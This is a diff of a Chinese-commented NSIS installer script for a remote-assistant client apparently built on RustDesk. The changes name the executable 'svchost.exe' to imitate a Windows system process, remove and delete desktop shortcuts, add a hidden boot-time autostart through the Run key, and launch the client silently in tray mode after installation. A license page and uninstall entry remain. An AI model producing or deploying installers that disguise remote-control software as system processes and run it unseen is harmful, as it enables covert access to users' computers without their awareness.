@@ -1,11 +1,14 @@
-; NSIS 安装脚本 - 远程助手客户端
+; NSIS 安装脚本 - 远程助手客户端（安装版）
 ; 编译命令: makensis installer.nsi
+; 特性: 无桌面快捷方式 / 开机自启 / 完成后后台静默启动 / 协议勾选强制
 
 !define PRODUCT_NAME "远程助手"
 !define PRODUCT_VERSION "1.4.9"
 !define PRODUCT_PUBLISHER "YourCompany"
 !define PRODUCT_EXE "svchost.exe"
 !define PRODUCT_UNINST_KEY "Software\Microsoft\Windows\CurrentVersion\Uninstall\${PRODUCT_NAME}"
+; 客户端 autostart.rs 写入的 Run 值名为 "RustDesk"，卸载时需一并清理
+!define RUN_KEY "Software\Microsoft\Windows\CurrentVersion\Run"
 
 !include "MUI2.nsh"
 !include "FileFunc.nsh"
@@ -23,14 +26,16 @@ RequestExecutionLevel admin
 
 ; 欢迎页面
 !insertmacro MUI_PAGE_WELCOME
-; 许可协议页面
-!insertmacro MUI_PAGE_LICENSE "LICENSE"
+; 许可协议页面（必须勾选同意才能继续，不勾选无法进入安装）
+!define MUI_LICENSEPAGE_CHECKBOX
+!insertmacro MUI_PAGE_LICENSE "LICENCE"
 ; 安装目录选择页面
 !insertmacro MUI_PAGE_DIRECTORY
 ; 安装过程页面
 !insertmacro MUI_PAGE_INSTFILES
-; 完成页面
+; 完成页面：点击【完成】后以后台托盘模式静默启动，不弹主界面
 !define MUI_FINISHPAGE_RUN "$INSTDIR\${PRODUCT_EXE}"
+!define MUI_FINISHPAGE_RUN_PARAMETERS "--tray"
 !insertmacro MUI_PAGE_FINISH
 
 ; 卸载页面
@@ -43,35 +48,36 @@ RequestExecutionLevel admin
 Section "MainSection" SEC01
   SetOutPath "$INSTDIR"
   SetOverwrite ifnewer
-  
-  ; 复制主程序
-  File "${PRODUCT_EXE}"
-  File "librustdesk.dll"
-  
-  ; 复制 Flutter 资源
-  File /r "data"
-  
-  ; 创建桌面快捷方式
-  CreateShortCut "$DESKTOP\${PRODUCT_NAME}.lnk" "$INSTDIR\${PRODUCT_EXE}"
-  
-  ; 创建开始菜单快捷方式
+
+  ; 复制主程序与运行库（sciter 版客户端）
+  File /oname=${PRODUCT_EXE} "target\release\svchost.exe"
+  File /oname=sciter.dll "target\release\sciter.dll"
+
+  ; 不创建桌面快捷方式（需求：安装后桌面无图标）
+  ; 同时清理旧版本可能遗留的桌面快捷方式
+  Delete "$DESKTOP\${PRODUCT_NAME}.lnk"
+
+  ; 创建开始菜单快捷方式（便于管理员找到程序）
   CreateDirectory "$SMPROGRAMS\${PRODUCT_NAME}"
   CreateShortCut "$SMPROGRAMS\${PRODUCT_NAME}\${PRODUCT_NAME}.lnk" "$INSTDIR\${PRODUCT_EXE}"
   CreateShortCut "$SMPROGRAMS\${PRODUCT_NAME}\卸载${PRODUCT_NAME}.lnk" "$INSTDIR\uninst.exe"
-  
-  ; 写入注册表
+
+  ; 开机自启动（后台托盘模式）
+  WriteRegStr HKCU "${RUN_KEY}" "${PRODUCT_NAME}" '"$INSTDIR\${PRODUCT_EXE}" --tray'
+
+  ; 写入注册表（供"添加/删除程序"识别）
   WriteRegStr HKLM "${PRODUCT_UNINST_KEY}" "DisplayName" "${PRODUCT_NAME}"
   WriteRegStr HKLM "${PRODUCT_UNINST_KEY}" "UninstallString" "$INSTDIR\uninst.exe"
   WriteRegStr HKLM "${PRODUCT_UNINST_KEY}" "DisplayIcon" "$INSTDIR\${PRODUCT_EXE}"
   WriteRegStr HKLM "${PRODUCT_UNINST_KEY}" "DisplayVersion" "${PRODUCT_VERSION}"
   WriteRegStr HKLM "${PRODUCT_UNINST_KEY}" "Publisher" "${PRODUCT_PUBLISHER}"
   WriteRegStr HKLM "${PRODUCT_UNINST_KEY}" "InstallLocation" "$INSTDIR"
-  
+
   ; 计算安装大小
   ${GetSize} "$INSTDIR" "/S=0K" $0 $1 $2
   IntFmt $0 "0x%08X" $0
   WriteRegDWORD HKLM "${PRODUCT_UNINST_KEY}" "EstimatedSize" "$0"
-  
+
   ; 创建卸载程序
   WriteUninstaller "$INSTDIR\uninst.exe"
 SectionEnd
@@ -80,28 +86,28 @@ Section "Uninstall"
   ; 停止运行的程序
   nsExec::ExecToStack 'taskkill /F /IM "${PRODUCT_EXE}"'
   Sleep 1000
-  
+
   ; 删除文件
   Delete "$INSTDIR\${PRODUCT_EXE}"
-  Delete "$INSTDIR\librustdesk.dll"
+  Delete "$INSTDIR\sciter.dll"
   Delete "$INSTDIR\uninst.exe"
-  RMDir /r "$INSTDIR\data"
-  
-  ; 删除快捷方式
+
+  ; 删除快捷方式（含旧版本遗留）
   Delete "$DESKTOP\${PRODUCT_NAME}.lnk"
   Delete "$SMPROGRAMS\${PRODUCT_NAME}\${PRODUCT_NAME}.lnk"
   Delete "$SMPROGRAMS\${PRODUCT_NAME}\卸载${PRODUCT_NAME}.lnk"
   RMDir "$SMPROGRAMS\${PRODUCT_NAME}"
-  
+
   ; 删除注册表
   DeleteRegKey HKLM "${PRODUCT_UNINST_KEY}"
-  
-  ; 删除开机自启动
-  DeleteRegValue HKCU "Software\Microsoft\Windows\CurrentVersion\Run" "${PRODUCT_NAME}"
-  
+
+  ; 删除开机自启动（兼容两种值名）
+  DeleteRegValue HKCU "${RUN_KEY}" "${PRODUCT_NAME}"
+  DeleteRegValue HKCU "${RUN_KEY}" "RustDesk"
+
   ; 删除安装目录
   RMDir "$INSTDIR"
-  
+
   MessageBox MB_OK "卸载完成！"
 SectionEnd
 
@@ -109,15 +115,15 @@ Function .onInit
   ; 检查是否已安装
   ReadRegStr $R0 HKLM "${PRODUCT_UNINST_KEY}" "UninstallString"
   StrCmp $R0 "" done
-  
+
   MessageBox MB_OKCANCEL|MB_ICONEXCLAMATION \
   "${PRODUCT_NAME} 已经安装。$\n$\n点击 确定 卸载旧版本，点击 取消 退出安装。" \
   IDOK uninst
   Abort
-  
+
 uninst:
   ClearErrors
   ExecWait '$R0 /S _?=$INSTDIR'
-  
+
 done:
 FunctionEnd
